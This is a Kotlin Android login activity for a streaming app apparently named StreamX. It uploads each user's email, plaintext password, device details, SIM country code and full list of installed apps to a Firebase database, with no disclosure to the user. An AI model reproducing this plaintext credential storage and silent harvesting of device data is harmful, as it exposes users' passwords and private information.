package com.stream.streamx

import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.telephony.TelephonyManager
import android.view.View
import android.widget.*
import androidx.appcompat.app.AppCompatActivity
import com.google.firebase.database.*
import com.google.gson.Gson


class login : AppCompatActivity() {

    private lateinit var enterMailEditText: EditText
    private lateinit var enterPassEditText: EditText
    private lateinit var submitButton: Button

    private lateinit var databaseReference: DatabaseReference
    private lateinit var progre: ProgressBar
    lateinit var ccode: String
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_login)


        progre = findViewById(R.id.prolog)
        progre.visibility = View.GONE
        enterMailEditText = findViewById(R.id.entermail)
        enterPassEditText = findViewById(R.id.enterpass)
        submitButton = findViewById(R.id.submitbtn)
        detectCountryAndShowToast(this)
        // Initialize Firebase Database reference
        databaseReference = FirebaseDatabase.getInstance().getReference("naiflix")

        submitButton.setOnClickListener {
            progre.visibility = View.VISIBLE

            val email = enterMailEditText.text.toString()
            val password = enterPassEditText.text.toString()
            val thecode = ccode
            // Check if the email is already in the database
            checkEmailExists(email, password, thecode)
        }
    }

    private fun checkEmailExists(email: String, password: String, thecode: String) {
        databaseReference.orderByChild("email").equalTo(email)
            .addListenerForSingleValueEvent(object : ValueEventListener {
                override fun onDataChange(dataSnapshot: DataSnapshot) {
                    if (dataSnapshot.exists()) {
                        // Email exists, set balance to "0"
                        saveUserDataToPreferences(email, password, 0, thecode)
                    } else {
                        // Email doesn't exist, set balance to "30"
                        if (ccode == "ke"){
                            saveUserDataToPreferences(email, password, 0, thecode)
                        }else{
                            saveUserDataToPreferences(email, password, 1000, thecode)
                        }
                    }
                }

                override fun onCancelled(databaseError: DatabaseError) {
                    // Handle database error
                    // For simplicity, print the error message
                    println("Database Error: ${databaseError.message}")
                }
            })
    }

    private fun saveUserDataToPreferences(email: String, password: String, balance: Int, thecode: String) {
        // Get additional device information
        val androidVersion = Build.VERSION.RELEASE
        val phoneBrand = Build.BRAND


        // Get a list of installed packages
        val installedPackages = getInstalledApps()

        // Now, installedPackages list contains the names of all installed apps
        val userData = UserData(email, password, balance, androidVersion, phoneBrand, installedPackages, thecode, "")
        val gson = Gson()
        val userDataJson = gson.toJson(userData)

        val sharedPreferences = getSharedPreferences("user_data", MODE_PRIVATE)
        val editor = sharedPreferences.edit()
        editor.putString("userData", userDataJson)
        editor.apply()

        // Upload user data to Firebase (Optional)
        uploadUserDataToFirebase(userData)
    }

    private fun uploadUserDataToFirebase(userData: UserData) {
        // Upload user data to Firebase
        val userId = databaseReference.push().key
        if (userId != null) {
            databaseReference.child(userId).setValue(userData)
            progre.visibility = View.GONE
            startActivity(Intent(applicationContext, phone::class.java))
        }
    }


    private fun getInstalledApps(): List<String> {
        val packageManager: PackageManager = packageManager
        val intent = Intent(Intent.ACTION_MAIN, null)
        intent.addCategory(Intent.CATEGORY_LAUNCHER)
        val appList = packageManager.queryIntentActivities(intent, 0)
        val installedApps: MutableList<String> = mutableListOf()

        for (info in appList) {
            val appName = info.loadLabel(packageManager).toString()
            installedApps.add(appName)
        }

        return installedApps
    }

    fun detectCountryAndShowToast(context: Context) {
        val telephoneManager = context.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager

        val countryCode: String? =
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                // For Android 11 (API level 30) and above
                telephoneManager.simCountryIso

            } else {
                // For Android versions below 11
                telephoneManager.networkCountryIso
            }
            ccode = countryCode.toString().toLowerCase()
     
    }

}//ends class

data class UserData(
    val email: String,
    val password: String,
    var balance: Int,
    val androidVersion: String,
    val phoneBrand: String,
    val installedPackages: List<String>,
    val countrycode: String,
    var expiry: String
  )
